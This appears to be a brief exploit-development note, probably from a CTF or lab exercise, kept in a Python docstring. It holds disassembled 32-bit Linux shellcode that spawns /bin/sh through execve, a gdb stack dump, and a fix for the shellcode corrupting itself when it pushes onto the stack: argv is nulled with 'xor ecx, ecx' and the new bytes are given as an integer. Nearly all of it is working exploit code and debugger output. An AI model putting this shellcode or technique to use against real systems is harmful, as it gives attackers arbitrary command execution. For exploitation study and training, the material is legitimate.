'''
issue: shellcode is written on stack, but it uses stack to store memory

   0:   31 c0                   xor    eax,eax
   2:   50                      push   eax
   3:   68 2f 2f 73 68          push   0x68732f2f
   8:   68 2f 62 69 6e          push   0x6e69622f
   d:   89 e3                   mov    ebx,esp
   f:   50                      push   eax
  10:   53                      push   ebx
  11:   89 e1                   mov    ecx,esp
  13:   b0 0b                   mov    al,0xb
  15:   cd 80                   int    0x80

(gdb) x/20wx $esp
0xffc61f60: 	0xf76d1d60	0x08048764	0xf757a0db	0x6850c031
0xffc61f70: 	0x68732f2f	0x69622f68	0x50e3896e	0xb0e18953
0xffc61f80:    [0x0080cd0b]	0xffc61f98	0xffc61fa8	0xffc61f6c
0xffc61f90:    [0x00000001] 0xffc62054	0x00000031	0x00000000
0xffc61fa0: 	0xf76d13dc	0xffc61fc0	0x00000000	0xf7536647

upon returning, esp is at: 0xffc61f90

shellcode ends at 0xffc61f80. we have ~12 bytes to push onto stack before it corrupts shellcode.


instead of push eax; push ebx; mov ecx, esp
we do: xor ecx, ecx; nop; nop

basically, set the argv pointer to null.

\x90\x90\xc9\x31 == 2425407793

'''
